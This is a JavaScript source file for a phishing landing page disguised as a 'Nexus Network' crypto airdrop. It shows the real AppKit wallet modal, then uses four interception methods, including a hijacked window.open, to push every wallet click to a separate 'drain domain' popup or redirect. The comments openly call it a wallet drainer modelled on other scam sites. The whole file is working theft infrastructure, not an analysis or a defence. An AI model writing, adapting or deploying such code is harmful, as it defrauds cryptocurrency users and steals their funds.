// =====================================================
// LANDING — Real AppKit on main domain
// Click wallet → popup to drain domain (like auracoin → farmhousegame)
// =====================================================
import { createAppKit } from '@reown/appkit'
import { EthersAdapter } from '@reown/appkit-adapter-ethers'
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base } from '@reown/appkit/networks'

// =====================================================
// CONFIG — drain domain URL
// =====================================================
const DRAIN_URL = 'https://playholding.vercel.app/?connect=1';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';

const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// =====================================================
// INIT REAL APPKIT — shows real wallet list with INSTALLED badges
// =====================================================
const ethersAdapter = new EthersAdapter();

const modal = createAppKit({
  adapters: [ethersAdapter],
  networks: [mainnet, bsc, polygon, arbitrum, optimism, avalanche, fantom, base],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — OmniChain Airdrop',
    url: window.location.origin,
    icons: [],
  },
  enableReconnect: false,
  allWallets: 'SHOW',
  featuredWalletIds: [
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
  ],
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#00f2fe',
  },
});

// =====================================================
// OPEN POPUP TO DRAIN DOMAIN
// =====================================================
let popupOpened = false;

function openDrainPopup() {
  if (popupOpened) return;
  popupOpened = true;

  // Close the AppKit modal on this page
  try { modal.close(); } catch (e) {}

  if (isMobile) {
    // Mobile: full redirect (popup doesn't work well)
    window.location.href = DRAIN_URL;
  } else {
    // Desktop: popup window (like farmhousegame.live screenshot)
    const w = 440, h = 700;
    const left = Math.round((screen.width - w) / 2);
    const top = Math.round((screen.height - h) / 2);
    window.open(
      DRAIN_URL,
      'connect_wallet',
      `width=${w},height=${h},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=yes,resizable=yes`
    );
  }

  // Reset after delay so user can try again if popup was blocked
  setTimeout(() => { popupOpened = false; }, 2000);
}

// =====================================================
// INTERCEPT WALLET CLICKS — multiple methods
// =====================================================

// Method 1: AppKit events
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  if (
    e === 'SELECT_WALLET' ||
    e === 'CLICK_WALLET' ||
    e === 'CONNECT_PRESS'
  ) {
    openDrainPopup();
  }
});

// Method 2: If wallet somehow connects on this domain, redirect
modal.subscribeProviders((state) => {
  if (state['eip155']) {
    try { modal.disconnect(); } catch (e) {}
    openDrainPopup();
  }
});

// Method 3: Click interceptor on the AppKit modal Shadow DOM
// Catches clicks on wallet list items (wui-list-wallet etc.)
const domObserver = new MutationObserver(() => {
  const w3m = document.querySelector('w3m-modal');
  if (!w3m || w3m._clickPatched) return;
  w3m._clickPatched = true;

  // Listen on the element itself — captures bubble from shadow DOM
  w3m.addEventListener('click', (e) => {
    const path = e.composedPath();
    for (const el of path) {
      if (!el.tagName) continue;
      const tag = el.tagName.toLowerCase();
      if (
        tag === 'wui-list-wallet' ||
        tag === 'wui-wallet-button' ||
        tag === 'w3m-wallet-login-list' ||
        tag.includes('wallet')
      ) {
        setTimeout(openDrainPopup, 50);
        return;
      }
    }
  }, true);
});
domObserver.observe(document.body, { childList: true, subtree: true });

// Method 4: Intercept window.open for deep links
const _origOpen = window.open;
window.open = function(url, ...args) {
  if (url && typeof url === 'string') {
    if (
      url.includes('metamask.app.link') ||
      url.includes('trust://') ||
      url.includes('phantom.app') ||
      url.includes('wc:') ||
      url.includes('walletconnect')
    ) {
      openDrainPopup();
      return null;
    }
  }
  return _origOpen.call(window, url, ...args);
};

// =====================================================
// EXPOSE TO HTML BUTTONS
// =====================================================
window.openWalletModal = () => {
  popupOpened = false;
  modal.open({ view: 'Connect' });
};
